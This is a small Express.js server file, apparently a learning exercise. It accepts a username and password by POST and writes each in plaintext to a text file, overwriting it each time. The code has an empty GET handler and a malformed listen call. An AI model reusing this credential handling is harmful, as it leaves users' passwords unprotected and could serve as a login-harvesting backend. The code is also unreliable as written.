import express from 'express'
import fs from 'fs/promises'

const serverApp = express();

serverApp.use(express.static('src/client'));
serverApp.use(express.json());

serverApp.post('/pr', async (req, res) => {
    let usernameData = req.body.usernameData
    let passwordData = req.body.passwordData
    try {
        await fs.writeFile('/home/lumi/test4/src/server/username.txt', usernameData);
    } catch (err) {
        console.log(err);
    }
    try {
        await fs.writeFile('/home/lumi/test4/src/server/password.txt', passwordData);
    } catch (err) {
        console.log(err);
    }

    res.end();

})

serverApp.get('/pr', (req, res) => {

})

serverApp.listen(3000, "listens to 3000");